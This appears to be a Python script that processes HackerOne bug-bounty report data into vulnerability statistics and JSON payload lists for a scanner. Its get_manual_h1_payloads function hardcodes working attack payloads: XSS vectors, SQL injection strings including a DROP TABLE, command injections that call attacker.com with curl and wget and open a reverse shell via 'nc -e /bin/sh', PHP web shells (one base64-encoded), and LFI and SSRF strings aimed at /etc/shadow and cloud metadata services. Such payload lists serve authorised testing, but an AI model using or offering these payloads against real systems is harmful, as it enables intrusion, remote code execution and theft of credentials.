#!/usr/bin/env python3
"""
HackerOne CSV Data Processor - Extracts vulnerability patterns from CSV data
Creates intelligence database for universal vulnerability scanning

NO HARDCODED TARGET-SPECIFIC LOGIC - Learns universal patterns
"""

import json
import csv
import re
import os
from pathlib import Path
from typing import Dict, List, Any, Optional
from collections import defaultdict, Counter

def process_hackerone_csv(csv_path: str = "hackerone-reports/data.csv", output_dir: str = "ultimate_payloads"):
    """Process HackerOne CSV data to extract vulnerability patterns"""
    
    csv_file = Path(csv_path)
    out_dir = Path(output_dir)
    out_dir.mkdir(exist_ok=True)
    
    if not csv_file.exists():
        print(f"❌ CSV file not found: {csv_path}")
        return
        
    print(f"🔍 Processing HackerOne CSV: {csv_path}")
    
    # Statistics
    vuln_stats = Counter()
    program_stats = Counter()
    bounty_stats = defaultdict(list)
    payload_patterns = defaultdict(set)
    
    # Process CSV
    with open(csv_file, 'r', encoding='utf-8') as f:
        reader = csv.DictReader(f)
        
        for row in reader:
            program = row.get('program', '').strip()
            title = row.get('title', '').strip()
            upvotes = int(row.get('upvotes', 0) or 0)
            bounty = float(row.get('bounty', 0) or 0)
            vuln_type = row.get('vuln_type', '').strip()
            
            if not title:
                continue
                
            # Normalize vulnerability type
            normalized_vuln = normalize_vuln_type(vuln_type, title)
            
            vuln_stats[normalized_vuln] += 1
            program_stats[program] += 1
            bounty_stats[normalized_vuln].append(bounty)
            
            # Extract payloads from title
            payloads = extract_payloads_from_title(title, normalized_vuln)
            for payload in payloads:
                payload_patterns[normalized_vuln].add(payload)
    
    # Generate intelligence files
    intelligence = {
        'vulnerability_statistics': dict(vuln_stats.most_common()),
        'top_programs': dict(program_stats.most_common(50)),
        'bounty_analysis': {},
        'payload_intelligence': {}
    }
    
    # Bounty analysis
    for vuln_type, bounties in bounty_stats.items():
        if bounties:
            non_zero_bounties = [b for b in bounties if b > 0]
            intelligence['bounty_analysis'][vuln_type] = {
                'total_reports': len(bounties),
                'paid_reports': len(non_zero_bounties),
                'avg_bounty': sum(non_zero_bounties) / len(non_zero_bounties) if non_zero_bounties else 0,
                'max_bounty': max(bounties) if bounties else 0,
                'bounty_rate': len(non_zero_bounties) / len(bounties) if bounties else 0
            }
    
    # Payload intelligence
    for vuln_type, payloads in payload_patterns.items():
        if payloads:
            # Convert set to list and take top 100
            payload_list = list(payloads)[:100]
            intelligence['payload_intelligence'][vuln_type] = {
                'count': len(payloads),
                'top_payloads': payload_list
            }
    
    # Write intelligence file
    with open(out_dir / 'h1_intelligence.json', 'w') as f:
        json.dump(intelligence, f, indent=2)
    
    # Write enhanced payload categorization
    enhanced_payloads = {}
    for vuln_type, payloads in payload_patterns.items():
        enhanced_payloads[vuln_type] = list(payloads)
        
    # Add manual high-value payloads based on HackerOne patterns
    enhanced_payloads.update(get_manual_h1_payloads())
    
    with open(out_dir / 'h1_enhanced_payloads.json', 'w') as f:
        json.dump(enhanced_payloads, f, indent=2)
    
    print(f"✅ Processed {sum(vuln_stats.values())} reports")
    print(f"📊 Found {len(vuln_stats)} vulnerability types")
    print(f"🎯 Extracted {sum(len(p) for p in payload_patterns.values())} unique payloads")
    print(f"💰 Average bounties by type:")
    
    for vuln_type, analysis in sorted(intelligence['bounty_analysis'].items(), 
                                     key=lambda x: x[1]['avg_bounty'], reverse=True)[:10]:
        if analysis['avg_bounty'] > 0:
            print(f"   {vuln_type}: ${analysis['avg_bounty']:.0f} avg, {analysis['bounty_rate']:.0%} paid")

def normalize_vuln_type(vuln_type: str, title: str) -> str:
    """Normalize vulnerability type to standard categories"""
    vuln_lower = vuln_type.lower()
    title_lower = title.lower()
    
    # XSS variants
    if any(term in vuln_lower for term in ['xss', 'cross-site scripting']):
        if 'stored' in vuln_lower or 'persistent' in title_lower:
            return 'xss_stored'
        elif 'reflected' in vuln_lower or 'reflected' in title_lower:
            return 'xss_reflected'
        elif 'dom' in vuln_lower or 'dom' in title_lower:
            return 'xss_dom'
        else:
            return 'xss'
            
    # SQL Injection
    elif any(term in vuln_lower for term in ['sql injection', 'sqli']):
        if 'blind' in vuln_lower or 'blind' in title_lower:
            return 'sql_injection_blind'
        elif 'time' in vuln_lower or 'time-based' in title_lower:
            return 'sql_injection_time'
        else:
            return 'sql_injection'
            
    # Command Injection
    elif any(term in vuln_lower for term in ['command injection', 'code injection', 'rce', 'remote code']):
        return 'command_injection'
        
    # File Upload
    elif any(term in vuln_lower for term in ['file upload', 'upload']):
        return 'file_upload'
        
    # CSRF
    elif any(term in vuln_lower for term in ['csrf', 'cross-site request']):
        return 'csrf'
        
    # SSRF
    elif any(term in vuln_lower for term in ['ssrf', 'server-side request']):
        return 'ssrf'
        
    # Local File Inclusion
    elif any(term in vuln_lower for term in ['lfi', 'local file', 'path traversal', 'directory traversal']):
        return 'lfi'
        
    # Remote File Inclusion
    elif any(term in vuln_lower for term in ['rfi', 'remote file']):
        return 'rfi'
        
    # IDOR
    elif any(term in vuln_lower for term in ['idor', 'insecure direct object']):
        return 'idor'
        
    # Open Redirect
    elif any(term in vuln_lower for term in ['open redirect', 'url redirection']):
        return 'open_redirect'
        
    # Authentication issues
    elif any(term in vuln_lower for term in ['auth', 'authentication', 'login bypass']):
        return 'authentication_bypass'
        
    # Information Disclosure
    elif any(term in vuln_lower for term in ['information disclosure', 'data exposure']):
        return 'info_disclosure'
        
    # Business Logic
    elif any(term in vuln_lower for term in ['business logic', 'logic flaw']):
        return 'business_logic'
        
    # Privilege Escalation
    elif any(term in vuln_lower for term in ['privilege escalation', 'privilege']):
        return 'privilege_escalation'
        
    else:
        # Try to classify from title
        if any(term in title_lower for term in ['xss', 'script', 'alert']):
            return 'xss'
        elif any(term in title_lower for term in ['sql', 'injection', 'union']):
            return 'sql_injection'
        elif any(term in title_lower for term in ['upload', 'file']):
            return 'file_upload'
        elif any(term in title_lower for term in ['csrf', 'forgery']):
            return 'csrf'
        elif any(term in title_lower for term in ['ssrf', 'request']):
            return 'ssrf'
        else:
            return 'web_application'

def extract_payloads_from_title(title: str, vuln_type: str) -> List[str]:
    """Extract potential payloads from vulnerability title"""
    payloads = []
    title_lower = title.lower()
    
    # XSS payload patterns
    if 'xss' in vuln_type:
        xss_patterns = [
            r'<script[^>]*>.*?</script>',
            r'<img[^>]+onerror[^>]*=.*?>',
            r'<svg[^>]+onload[^>]*=.*?>',
            r'javascript:[^"\s\'"]+',
            r'alert\([^)]*\)',
            r'<iframe[^>]*src[^>]*>',
            r'<object[^>]*>',
            r'<embed[^>]*>',
            r'onerror\s*=\s*[^>]+',
            r'onload\s*=\s*[^>]+',
        ]
        
        for pattern in xss_patterns:
            matches = re.findall(pattern, title, re.IGNORECASE | re.DOTALL)
            payloads.extend([match.strip() for match in matches if match.strip()])
            
    # SQL Injection patterns
    elif 'sql' in vuln_type:
        sql_patterns = [
            r"'[^']*\s+or\s+[^']*'[^']*'",
            r"union\s+select.*?from\s+\w+",
            r"'[^']*;\s*--",
            r"'[^']*\s+and\s+sleep\s*\([^)]*\)",
            r"'[^']*waitfor\s+delay",
            r"'\s*or\s*1\s*=\s*1",
            r"'\s*or\s*'1'\s*=\s*'1",
            r"order_id",  # Common parameter name
            r"id\s*=\s*\d+",
        ]
        
        for pattern in sql_patterns:
            matches = re.findall(pattern, title, re.IGNORECASE | re.DOTALL)
            payloads.extend([match.strip() for match in matches if match.strip()])
            
    # Command injection patterns
    elif 'command' in vuln_type or 'rce' in vuln_type:
        cmd_patterns = [
            r';\s*[a-z]+',
            r'\|\s*[a-z]+',
            r'&&\s*[a-z]+',
            r'`[^`]+`',
            r'\$\([^)]+\)',
            r'exec\s*\([^)]*\)',
            r'system\s*\([^)]*\)',
            r'eval\s*\([^)]*\)',
        ]
        
        for pattern in cmd_patterns:
            matches = re.findall(pattern, title, re.IGNORECASE)
            payloads.extend([match.strip() for match in matches if match.strip()])
    
    # Extract parameter names from titles (common pattern)
    param_patterns = [
        r'via\s+`([^`]+)`\s+parameter',
        r'parameter\s+`([^`]+)`',
        r'`([^`]+)`\s+param',
        r'through\s+`([^`]+)`',
        r'in\s+`([^`]+)`\s+field',
    ]
    
    for pattern in param_patterns:
        matches = re.findall(pattern, title, re.IGNORECASE)
        payloads.extend([f"{match}=PAYLOAD" for match in matches if match.strip()])
    
    # Clean and deduplicate payloads
    clean_payloads = []
    seen = set()
    for payload in payloads:
        clean = payload.strip()
        if clean and len(clean) > 2 and len(clean) < 200 and clean not in seen:
            clean_payloads.append(clean)
            seen.add(clean)
    
    return clean_payloads

def get_manual_h1_payloads():
    """Add high-value manual payloads based on HackerOne trends"""
    return {
        'xss': [
            '<script>alert(document.domain)</script>',
            '<img src=x onerror=alert(document.domain)>',
            '<svg onload=alert(document.domain)>',
            'javascript:alert(document.domain)',
            '"><script>alert(document.domain)</script>',
            '</script><script>alert(document.domain)</script>',
            '<iframe src="javascript:alert(document.domain)">',
            '<body onload=alert(document.domain)>',
            '<input onfocus=alert(document.domain) autofocus>',
            '<select onfocus=alert(document.domain) autofocus>',
            '<details open ontoggle=alert(document.domain)>',
            '<marquee onstart=alert(document.domain)>',
            '<<SCRIPT>alert(document.domain)//<</SCRIPT>',
            '<IMG SRC=/ onerror="alert(document.domain)"></img>',
            '<svg/onload=alert(document.domain)>',
        ],
        'sql_injection': [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "'; DROP TABLE users--",
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR '1'='1' /*",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT user(),version(),database()--",
            "1' OR 1=1 LIMIT 1 -- -+",
            "1') OR 1=1 LIMIT 1 -- -+",
            "1')) OR 1=1 LIMIT 1 -- -+",
        ],
        'command_injection': [
            '; id',
            '&& id',
            '| id',
            '|| id',
            '`id`',
            '$(id)',
            '; whoami',
            '; cat /etc/passwd',
            '; ls -la',
            '; sleep 5',
            '| sleep 5',
            '&& sleep 5',
            '; curl http://attacker.com/',
            '; wget http://attacker.com/',
            '$(curl http://attacker.com/)',
            '`curl http://attacker.com/`',
            '; nc -e /bin/sh attacker.com 4444',
        ],
        'file_upload': [
            'shell.php',
            'shell.php.png',
            'shell.phtml',
            'shell.php5',
            'shell.php3',
            'shell.jsp',
            'shell.asp',
            'shell.aspx',
            'webshell.php',
            'cmd.php',
            '<?php system($_GET["c"]); ?>',
            '<?php exec($_POST["cmd"]); ?>',
            '<%eval request("cmd")%>',
        ],
        'lfi': [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '/etc/passwd',
            '/etc/shadow',
            '/proc/self/environ',
            '/var/log/apache/access.log',
            'php://filter/convert.base64-encode/resource=index.php',
            'php://input',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=',
            '/proc/version',
            '/etc/hostname',
            '/proc/self/cmdline',
        ],
        'ssrf': [
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost:8080',
            'http://127.0.0.1:22',
            'file:///etc/passwd',
            'gopher://127.0.0.1:6379/_INFO',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/metadata/v1/maintenance',
            'http://[::]:80/',
            'http://0000::1:80/',
            'http://[::]:22/',
        ],
        'idor': [
            'user_id=1',
            'id=1337',
            'account_id=123',
            'order_id=456',
            'file_id=789',
            'document_id=999',
        ],
        'open_redirect': [
            '//evil.com',
            'http://evil.com',
            '\\evil.com',
            '/\\evil.com',
            '//evil.com@good.com',
            'javascript:alert(1)',
        ],
    }

if __name__ == "__main__":
    process_hackerone_csv()